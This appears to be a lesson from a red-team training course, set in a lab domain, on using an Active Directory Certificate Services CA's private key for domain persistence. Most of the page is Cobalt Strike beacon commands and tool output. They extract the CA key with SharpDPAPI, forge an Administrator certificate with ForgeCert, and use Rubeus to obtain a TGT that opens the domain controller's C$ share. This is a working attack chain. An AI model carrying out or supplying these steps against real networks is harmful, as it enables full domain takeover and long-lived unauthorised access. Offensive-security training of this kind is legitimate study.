In larger organisations, the AD CS roles are installed on separate servers and not on the domain controllers themselves.  Often times, they are also not treated with the same sensitivity as DCs.  So whereas only EAs and DAs can access/manage DCs, "lower level" roles such as server admins can often access the CAs.

So although this can be also seen a privilege escalation, it's just as useful as a domain persistence method.

Gaining local admin access to a CA allows an attacker to extract the CA private key, which can be used to sign a forged certificate (think of this like the krbtgt hash being able to sign a forged TGT).  The default validity period for a CA private key is 5 years, but this can obviously be set to any value during setup, sometimes as high as 10+ years.

Once on a CA, [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) can extract the private keys.

```
beacon> run hostname
dc-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Debug\SharpDPAPI.exe certificates /machine
```


![](https://rto-assets.s3.eu-west-2.amazonaws.com/domain-dominance/private-ca-key.png)

  

You can generally tell this is the private CA key because the Issuer and Subject are both set to the distinguished name of the CA.  With any luck, the expiry date will also be long into the future.  Save the output to a `.pem` file and convert it to a `.pfx` with openssl on Kali, then move it back to the attacker-windows machine.

The next step is to build the forged certificate with [ForgeCert](https://github.com/GhostPack/ForgeCert).

```
C:\Users\Administrator\Desktop>C:\Tools\ForgeCert\ForgeCert\bin\Debug\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "password" --Subject "CN=User" --SubjectAltName "Administrator@cyberbotic.io" --NewCertPath fake.pfx --NewCertPassword "password"
CA Certificate Information:
  Subject:        CN=ca-1, DC=cyberbotic, DC=io
  Issuer:         CN=ca-1, DC=cyberbotic, DC=io
  Start Date:     2/25/2022 11:29:14 AM
  End Date:       2/25/2047 11:39:08 AM
  Thumbprint:     7F8A1EFB7A50E2D1DE098085301926AA13AE0A71
  Serial:         31AC83C6678F28994CFB58207C9FB668

Forged Certificate Information:
  Subject:        CN=User
  SubjectAltName: Administrator@cyberbotic.io
  Issuer:         CN=ca-1, DC=cyberbotic, DC=io
  Start Date:     3/1/2022 2:19:20 PM
  End Date:       3/1/2023 2:19:20 PM
  Thumbprint:     73C45EC22357C0451E0F374AC30B5C6F6034B132
  Serial:         009E1C0AE8A247695199F8157DB37E38AD

Done. Saved forged certificate to fake.pfx with the password 'password'
```

  

Even though you can specify any SubjectAltName, the user does need to be present in AD.  In this example, the default Administrator account is used.  Then we can simply use Rubeus to request a legitimate TGT with this forged certificate and use it to access the domain controller.

```
beacon> getuid
[*] You are DEV\bfarmer

beacon> ls \\dc-1.cyberbotic.io\c$
[-] could not open \\dc-1.cyberbotic.io\c$\*: 5

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:Administrator /domain:cyberbotic.io /certificate:MIACAQ[...snip...]IEAAAA /password:password /nowrap

[*] Using PKINIT with etype rc4_hmac and subject: CN=User 
[*] Building AS-REQ (w/ PKINIT preauth) for: 'cyberbotic.io\Administrator'
[*] Using domain controller: 10.10.15.75:88

[+] TGT request successful!
[*] base64(ticket.kirbi):

doIF4j [...snip...] 5pbw==

  ServiceName              :  krbtgt/cyberbotic.io
  ServiceRealm             :  CYBERBOTIC.IO
  UserName                 :  Administrator
  UserRealm                :  CYBERBOTIC.IO
  StartTime                :  3/1/2022 2:22:55 PM
  EndTime                  :  3/2/2022 12:22:55 AM
  RenewTill                :  3/8/2022 2:22:55 PM
  Flags                    :  name-canonicalize, pre-authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  WVE8rl7BfHlOdAPGq7cjJw==
  ASREP (key)              :  5681DDB25CFF9F80C65E4976DB23B0B7

beacon> make_token CYBER\Administrator FakePass
[+] Impersonated DEV\bfarmer

beacon> kerberos_ticket_use C:\Users\Administrator\Desktop\dc-1-tgt.kirbi

beacon> ls \\dc-1.cyberbotic.io\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 09:22:26   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
          dir     02/25/2022 11:20:17   inetpub
          dir     02/23/2018 11:06:05   PerfLogs
          dir     01/20/2022 15:55:20   Program Files
          dir     02/10/2021 02:01:55   Program Files (x86)
          dir     02/25/2022 12:10:08   ProgramData
          dir     10/18/2016 02:01:27   Recovery
          dir     01/20/2022 15:50:53   Shares
          dir     02/19/2021 10:18:17   System Volume Information
          dir     05/15/2021 16:48:31   Users
          dir     03/01/2022 14:06:29   Windows
 379kb    fil     01/28/2021 07:09:16   bootmgr
 1b       fil     07/16/2016 13:18:08   BOOTNXT
 512mb    fil     03/01/2022 10:13:44   pagefile.sys
```

We're not limited to forging user certificates, we can do the same for machines.  Combine this with the S4U2self trick to gain access to any machine or service in the domain.